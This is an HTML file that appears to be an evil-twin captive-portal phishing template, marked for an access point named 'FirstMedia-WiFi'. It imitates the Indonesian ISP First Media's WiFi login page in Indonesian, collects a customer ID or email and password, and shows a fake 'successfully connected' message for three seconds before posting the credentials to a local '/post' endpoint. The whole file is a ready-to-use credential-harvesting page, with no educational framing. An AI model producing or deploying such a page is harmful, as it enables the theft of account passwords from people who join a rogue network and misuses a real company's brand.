<!-- AP="FirstMedia-WiFi" -->
<!DOCTYPE html>
<html>
<head>
  <title>First Media - WiFi Login</title>
  <meta charset='UTF-8'>
  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
  <style>
    body{font-family: 'Segoe UI', Arial, sans-serif;background:#f2f2f2;margin:0;padding:0;display:flex;align-items:center;justify-content:center;min-height:100vh;}
    .card{background:#fff;border-radius:12px;overflow:hidden;max-width:400px;width:90%;box-shadow:0 8px 32px rgba(0,0,0,0.1);}
    .top-bar{background:linear-gradient(135deg,#ed1c24 0%,#b31217 100%);padding:30px 24px;text-align:center;}
    .top-bar h1{color:#fff;font-size:22px;margin:0;letter-spacing:1px;}
    .top-bar p{color:#ffcccc;font-size:13px;margin:6px 0 0 0;}
    .body{padding:28px 24px;}
    .status{background:#e8f5e9;border-radius:8px;padding:12px 16px;font-size:13px;color:#2e7d32;margin-bottom:20px;display:flex;align-items:center;gap:8px;}
    .status .dot{width:8px;height:8px;background:#4caf50;border-radius:50%;display:inline-block;}
    .input-group{margin-bottom:16px;}
    .input-group label{display:block;font-size:13px;color:#555;margin-bottom:4px;}
    .input-group input{width:100%;padding:12px 14px;border:1px solid #ddd;border-radius:6px;font-size:15px;box-sizing:border-box;}
    .input-group input:focus{border-color:#ed1c24;outline:none;}
    .btn{background:linear-gradient(135deg,#ed1c24 0%,#b31217 100%);color:#fff;border:none;border-radius:6px;padding:14px;font-size:16px;font-weight:700;width:100%;cursor:pointer;}
    .btn:hover{opacity:0.9;}
    .links{text-align:center;font-size:12px;color:#999;margin-top:16px;line-height:1.8;}
    .links a{color:#ed1c24;text-decoration:none;}
    #form-block{display:block;}
    #success-block{display:none;text-align:center;padding:20px 0;}
    #success-block .check{font-size:36px;}
    .loader{width:36px;height:36px;border:3px solid #f3f3f3;border-top:3px solid #ed1c24;border-radius:50%;animation:spin .8s linear infinite;margin:16px auto;}
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="card">
    <div class="top-bar">
      <h1>First Media</h1>
      <p>Internet & TV Cable</p>
    </div>
    <div class="body">
      <div class="status"><span class="dot"></span>Terhubung ke jaringan First Media</div>
      <div id="form-block">
        <p style="font-size:15px;color:#333;margin-bottom:16px;font-weight:600;">Masuk untuk menikmati internet</p>
        <form action='/post' id='login-form'>
          <div class="input-group">
            <label>ID Pelanggan / Email</label>
            <input name='username' type='text' placeholder='Masukkan ID pelanggan' required>
          </div>
          <div class="input-group">
            <label>Password</label>
            <input name='password' type='password' placeholder='Masukkan password' required>
          </div>
          <button class="btn" type="submit">Masuk</button>
        </form>
        <div class="links">
          <a href="#">Lupa password?</a> &bull; <a href="#">Daftar Baru</a><br>
          Hubungi <a href="#">Call Center</a> untuk bantuan
        </div>
      </div>
      <div id="success-block">
        <div class="check">✓</div>
        <p style="font-size:16px;color:#333;font-weight:600;">Berhasil terhubung!</p>
        <p style="font-size:13px;color:#666;">Mengarahkan ke halaman utama...</p>
        <div class="loader"></div>
      </div>
    </div>
  </div>
  <script>
    document.getElementById('login-form').addEventListener('submit', function(e) {
      e.preventDefault();
      document.getElementById('form-block').style.display = 'none';
      document.getElementById('success-block').style.display = 'block';
      setTimeout(function() { document.getElementById('login-form').submit(); }, 3000);
    });
  </script>
</body>
</html>
